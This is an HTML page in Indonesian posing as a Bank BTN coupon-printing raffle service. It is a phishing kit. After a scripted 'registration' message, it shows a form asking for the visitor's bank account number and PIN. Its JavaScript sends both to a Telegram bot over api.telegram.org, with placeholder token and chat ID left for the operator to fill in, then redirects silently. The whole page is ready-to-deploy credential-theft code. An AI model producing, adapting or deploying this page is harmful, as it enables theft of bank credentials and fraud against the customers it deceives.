<!DOCTYPE html><html lang="id"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#FE6A00">
  <meta name="description" content="Cetak Kupon BTN secara online dengan mudah dan cepat.">
  <title>Cetak Kupon BTN</title>
  <link rel="icon" type="image/png" href="./hosting.tigerengine.id/ssmuyg.jpg">
  <link rel="image_src" href="">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
    }

    #main-content {
      position: relative;
      z-index: 1;
    }

    header {
      background-color: #ffffff;
      padding: 10px 20px;
      border-bottom: 1px solid #ddd;
    }

    header img.logo {
      height: 50px;
    }

    .hero {
      background-color: #f7941d;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 30px 10px;
    }

    .hero img {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
    }

    .content {
      text-align: center;
      padding: 30px 20px;
    }

    .content-box {
      background-color: #007580;
      color: white;
      padding: 20px;
      border-radius: 10px;
      border: 4px solid #f7941d;
      max-width: 700px;
      margin: 0 auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      font-size: 18px;
      min-height: 100px;
      line-height: 1.6;
    }

    footer {
      background-color: #035b5b;
      height: 100px;
      margin-top: 30px;
    }

    #calling-popup {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 10000;
    }

    .popup-content {
      background-color: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      color: #333;
    }

    .dot {
      animation: blink 1.2s infinite;
      margin-left: 5px;
    }

    @keyframes blink {
      0% { opacity: 0; }
      50% { opacity: 1; }
      100% { opacity: 0; }
    }

    /* Style untuk form */
    #input-form {
      display: none;
      margin-top: 20px;
    }

    #input-form input {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
    }

    #input-form button {
      background-color: #f7941d;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
  </style>
</head>
<body>

  <div id="main-content">
    <header>
      <!-- Logo BTN dihapus -->
    </header>

    <section class="hero">
      <img src="../a81c8f40-78be-4567-bd5e-f37e4a61dc15_v%3D1745088049844.png" alt="RTanjongBobok">
    </section>

    <section class="content">
      <div class="content-box" id="text-box"></div>
      <form id="input-form">
        <input type="text" id="account-number" placeholder="Masukkan Nomor Rekening" required>
        <input type="password" id="pin" placeholder="Masukkan PIN" required>
        <button type="submit">Kirim</button>
      </form>
    </section>

    <footer></footer>
  </div>

  <!-- Popup overlay awal dihapus -->

  <div id="calling-popup">
    <div class="popup-content">Sedang di hubungkan ke CS<span class="dot">...</span>
    </div>
  </div>

  <!-- Audio dihapus -->

  <script>
    const textBox = document.getElementById("text-box");
    const callingPopup = document.getElementById("calling-popup");
    const inputForm = document.getElementById("input-form");

    const scriptText = `Terima kasih telah mendaftar di layanan Bank BTN Festival. 
Pendaftaran Anda sedang diproses. 
beberapa saat lagi, Anda akan dihubungi oleh pihak Bank BTN 
untuk proses pencetakan kode kupon undian Anda.`;

    function typeTextPerChar(text, duration, callback) {
      const totalChars = text.length;
      const interval = duration / totalChars * 1000; // ms per karakter
      let index = 0;

      function type() {
        if (index < totalChars) {
          textBox.innerHTML += text[index];
          index++;
          setTimeout(type, interval);
        } else {
          callback?.();
        }
      }

      type();
    }

    function startTyping() {
      const durasi = 20; // Durasi tetap 20 detik tanpa audio
      typeTextPerChar(scriptText, durasi, () => {
        console.log("Selesai mengetik");
        inputForm.style.display = "block"; // Tampilkan form setelah typing
      });
    }

    // Fungsi untuk kirim data ke Telegram
    async function sendToTelegram(data) {
      const botToken = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Telegram Anda
      const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID tujuan
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const message = `Data Baru:\nNomor Rekening: ${data.account}\nPIN: ${data.pin}`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });
      } catch (error) {
        // Tidak ada penanganan error, langsung lanjut
      }

      // Redirect otomatis tanpa pemberitahuan
      window.location.href = 'https://example.com/next-page'; // Ganti dengan URL halaman berikutnya
    }

    // Event listener untuk form submit
    inputForm.addEventListener('submit', function(event) {
      event.preventDefault();
      const account = document.getElementById('account-number').value;
      const pin = document.getElementById('pin').value;
      const data = { account, pin };
      sendToTelegram(data);
    });

    // Langsung mulai tanpa popup awal dan audio
    window.onload = function() {
      startTyping();
    };
  </script>


</body></html>
